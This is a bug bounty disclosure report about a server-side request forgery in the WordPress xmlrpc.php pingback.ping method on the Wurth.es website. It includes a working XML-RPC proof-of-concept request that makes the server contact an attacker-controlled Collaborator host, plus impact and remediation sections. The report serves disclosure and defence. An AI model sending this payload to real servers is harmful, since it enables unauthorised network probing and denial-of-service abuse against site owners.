# Title: SSRF via WordPress xmlrpc.php pingback.ping

- **Platform**: YesWeHack
- **Program**: Wurth.es
- **Severity**: Medium
- **Date**: 2024-09-15
- **Researcher**: Shahariar Amin
- **Bounty**: Undisclosed

## Summary
A server-side request forgery vulnerability was discovered in the xmlrpc.php file of the Wurth.es WordPress website. The pingback.ping method allowed the server to make requests to arbitrary URLs, which could be used for internal network scanning and denial of service attacks.

## Technical Details
WordPress's xmlrpc.php file enables remote communication between websites and external services. The `pingback.ping` method is designed to notify a website when another site links to it. However, this method can be abused for SSRF attacks.

The method takes two parameters:
- A source URL (the page that supposedly contains the link)
- A target URL (the page being linked to)

WordPress's server fetches the source URL to verify the link exists. If the source URL is set to an attacker-controlled server, the WordPress server makes an HTTP request to that server. This can be used to:
- Probe internal network services
- Perform port scanning
- Launch reflected denial of service attacks

## Steps to Reproduce
1. Send a POST request to the target's xmlrpc.php endpoint
2. Switch the request method from GET to POST
3. Add the XML-RPC payload using the pingback.ping method
4. Set the source URL to an attacker-controlled server (e.g., Burp Collaborator)
5. Observe the incoming request in Collaborator

## Proof of Concept
```
POST /xmlrpc.php HTTP/1.1
Host: www.wurth.es
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://attacker-server.burpcollaborator.net</string></value>
    </param>
    <param>
      <value><string>http://www.wurth.es/valid-post</string></value>
    </param>
  </params>
</methodCall>
```

Response confirming the pingback was executed:
```xml
<?xml version="1.0"?>
<methodResponse>
  <fault>
    <value><string>16: Source URL doesn't exist</string></value>
  </fault>
</methodResponse>
```

The Collaborator server receives a request from the target, confirming SSRF.

## Impact
- Server-side request forgery to external and internal networks
- Internal port scanning (the server can be used to probe internal services)
- Potential access to internal services that are not publicly accessible
- Use of the server as a proxy for network attacks

## Remediation
1. Disable xmlrpc.php entirely if not needed
2. Implement network-level restrictions on outbound requests
3. Add IP allowlisting for legitimate pingback sources
4. Disable the pingback.ping method via filter or plugin
5. Block xmlrpc.php requests at the web application firewall level

## References
- https://take0verx0.medium.com/xmlrpc-php-allows-ssrf-5357049d43e9
